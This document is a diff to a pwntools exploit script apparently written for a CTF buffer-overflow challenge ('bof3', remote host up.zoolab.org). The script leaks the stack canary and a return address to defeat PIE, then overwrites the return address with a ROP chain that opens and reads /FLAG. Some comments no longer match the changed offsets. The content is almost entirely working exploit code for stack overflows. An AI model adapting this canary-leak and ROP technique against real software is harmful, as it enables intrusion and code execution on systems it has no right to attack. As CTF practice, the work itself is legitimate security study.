@@ -10,12 +10,29 @@ context.arch = 'amd64'
 context.os = 'linux'
 context.endian = "little"
 # context.log_level = 'debug' # 取消註解以獲得更詳細的 pwntools 日誌
+BINARY_NAME = "./bof3"
+
+try:
+    elf = ELF(BINARY_NAME)
+except ELFError:
+    log.error(f"Could not load ELF file: {BINARY_NAME}.")
+    sys.exit(1)
 
 r = remote('up.zoolab.org', 12344) # Challenge 4 port
 
 leaked_canary = 0
 leaked_task_ret_addr = 0
 executable_base = 0
+
+
+# buf 1   -0xc0 16*12 - 8 185
+# buf 2   -0x90 16*9 + 8 152
+# buf 3   -0x60
+# msg     -0x30
+# canary  -0x08
+# ret      0x08
+
+
 
 try:
     # --- Stage 1: Leak Canary using buf1's printf ---
@@ -46,14 +63,17 @@ try:
         
         log.info(f"Bytes visibly leaked for canary (len {len(leaked_canary_high_bytes)}): {leaked_canary_high_bytes.hex()}")
 
-        if len(leaked_canary_high_bytes) == 13:
+        if len(leaked_canary_high_bytes) >= 7:
             log.warning("Only 7 bytes of canary material found.")
             log.info(f"Bytes visibly leaked for canary : {leaked_canary_high_bytes[0:7].hex()}")
             leaked_canary = u64(b'\x00' + leaked_canary_high_bytes[0:7])
-            junk = u64(leaked_canary_high_bytes[7:] + b"\x00\x00")
+            log.success(f"Reconstructed canary (LSB=00 + 7B): {hex(leaked_canary)}")
+        elif len(leaked_canary_high_bytes) == 6:
+            log.warning("Only 6 bytes of canary material found.")
+            leaked_canary = u64(b'\x00' + leaked_canary_high_bytes + b'\x00')
             log.success(f"Reconstructed canary (LSB=00 + 7B): {hex(leaked_canary)}")
         else:
-            log.error(f"Unexpected length for canary material: {len(leaked_canary_high_bytes)}. Expected 6 or 7.")
+            log.error(f"Unexpected length for canary material: {len(leaked_canary_high_bytes)}. Expected 7.")
             raise PwnlibException("Canary material length error")
             
     except Exception as e:
@@ -66,7 +86,7 @@ try:
     # Padding to fill from buf2 start, up to RetAddr start (exclusive):
     # This covers buf2 itself (40), then buf3 (40), then msg (40), then canary (8), then saved_rbp (8).
     # Total padding = 40 + 40 + 40 + 8 + 8 = 136 bytes.
-    padding_s2_to_ret_addr = 136
+    padding_s2_to_ret_addr = 152
     payload_s2_leak_retaddr = b'B' * padding_s2_to_ret_addr
     
     log.info(f"Stage 2: Sending {len(payload_s2_leak_retaddr)} 'B's to buf2 to leak return address (no newline)...")
@@ -126,8 +146,8 @@ try:
     # Ensure it's large enough. The original global `msg` was at `base + 0xef220`.
     # Even if not executable, it's writable. Let's use it as a data area.
     
-    flag_path_addr = elf.address + OFFSET_MSG_FROM_BASE # Put "/FLAG\0" here
-    read_buffer_addr = elf.address + OFFSET_MSG_FROM_BASE + 0x100 # Put flag content here
+    flag_path_addr = elf.bss() + 0x200 # Put "/FLAG\0" here
+    read_buffer_addr = elf.bss() + 0x200 + 0x20 # Put flag content here
 
     log.info(f"ROP: Address for '/FLAG': {hex(flag_path_addr)}")
     log.info(f"ROP: Address for read buffer: {hex(read_buffer_addr)}")
@@ -156,10 +176,12 @@ try:
 
     rop_chain_bytes = rop.chain()
     log.info(f"ROP chain (length {len(rop_chain_bytes)}):\n{rop.dump()}")
+
+    junk = u64(b'A' * 8)
     
     final_payload = b'X' * padding_msg_to_canary # Fill local msg up to canary
     final_payload += p64(leaked_canary)
-    final_payload += junk            # Overwrite task's saved RBP
+    final_payload += p64(junk)            # Overwrite task's saved RBP
     final_payload += rop_chain_bytes           # ROP chain starts at return address
 
     # The final read is into the local `msg` buffer.
@@ -184,7 +206,24 @@ try:
     flag_output = r.recvall(timeout=5.0)
     log.success("--- FLAG ---")
     if flag_output:
-        print(flag_output.decode(errors='ignore').strip())
+        try:
+            decoded_output = flag_output.decode(errors='ignore').strip()
+
+            start_index = decoded_output.find("FLAG{")
+            if start_index != -1:
+                end_index = decoded_output.find("}", start_index)
+                if end_index != -1:
+                    flag_only = decoded_output[start_index : end_index + 1]
+                    print(flag_only) # 只印出旗標
+                else:
+                    log.warning("Found 'FLAG{' but no closing '}'. Printing what was found.")
+                    print(decoded_output[start_index:]) # 從 FLAG{ 開始印
+            else:
+                log.warning("FLAG pattern 'FLAG{' not found in output. Printing full decoded output.")
+                print(decoded_output) # 如果找不到，還是印出全部
+        except Exception as e:
+            log.error(f"Error decoding or parsing flag: {e}")
+            print(repr(flag_output)) # 如果解碼失敗，印出原始位元組
     else:
         log.warning("No flag output received.")
     log.success("--------------")
